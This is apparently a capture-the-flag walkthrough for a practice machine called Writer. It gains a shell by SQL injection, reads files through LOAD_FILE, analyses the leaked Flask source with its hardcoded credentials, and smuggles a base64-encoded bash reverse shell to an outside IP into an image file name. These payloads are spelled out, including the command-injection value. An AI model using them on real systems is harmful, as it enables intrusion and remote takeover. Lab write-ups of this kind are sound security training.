# Initial shell as www-data
## Discovered SQL Injection on http://10.10.11.101/administrative
Entering malicious entry in username field of http://10.10.11.101/administrative.
![[Pasted image 20211004103558.png]]
Logged in as admin user after entering malicious sql queiry in username field of http://10.10.11.101/administrative.
![[Pasted image 20211004103756.png]]
## Using [MySQL LOAD_FILE() function](https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php) to read files on system 
We can run combine commands via `UNION SELECT` keywords but `UNION SELECT` QUERY must have same number of columns . As table storing users (have only one user as admin) have 6 columns so we will have the `UNION SELECT` selecting 6 columns with command `admin' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4,5,6#` . Output of this query in burpsuite is shown below.
![[Pasted image 20211004105357.png]]
Reading apache server virual hosts files to know about directories containing website source code and other virtual hosts in `/etc/apache2/sites-available/000-default.conf`
![[Pasted image 20211004110137.png]]
Reading code in `/var/www/writer.htb/writer.wsgi`,it is referring to `__init__.py`
in the app folder having all code related to `writer.htb` webapp.
![[Pasted image 20211004110316.png]]
Reading `__init__.py` in webapp directory `/var/www/writer.htb/writer/__init__.py`
![[Pasted image 20211004110719.png]]
Storing this code in readable format to analyze code.
![[Pasted image 20211004110901.png]]
`__init__.py` source code is as follows.
```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session['user'] = username
                return render_template('success.html', results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template('login.html', error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
        return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```
## Analyzing `__init__.py` reveals that `mv` command is vulnerable in `image_url` section of `__init__.py` code when image is added to story via url
```python
 if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()
```
Analyzing `__init__.py` reveals that `mv` command is vulnerable in `image_url` section of `__init__.py` code when image is added to story via url. So we can rename file like "clarkey10.jpg;\`echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC45OC80NDM7IGJhc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | bash\`"  , so that when image is uploaded via url , `mv` command is executed along with  base64 encoded reverse shell command in bash to get reverse shell as www-data.
## Stories can be added on url http://10.10.11.101/dashboard/stories
![[Pasted image 20211004113548.png]]
## Adding stories and uploading image from computer
Adding stories and uploading image from computer.
![[Pasted image 20211004114242.png]]
Uploaded images are stored in url http://10.10.11.101/static/img/
![[Pasted image 20211004114531.png]]
## Images can also be uploaded from url which can trigger `mv` to get reverse shell
![[Pasted image 20211004114644.png]]
## Now uploading the "uploaded image/file from computer" via url using file:/// protocol to get reverse shell via intercepting request from burpsuite and forwarding via repeater after changing request
![[Pasted image 20211004120002.png]]
Note: Use file:/// protocol instead of http:// while uploading image from url.








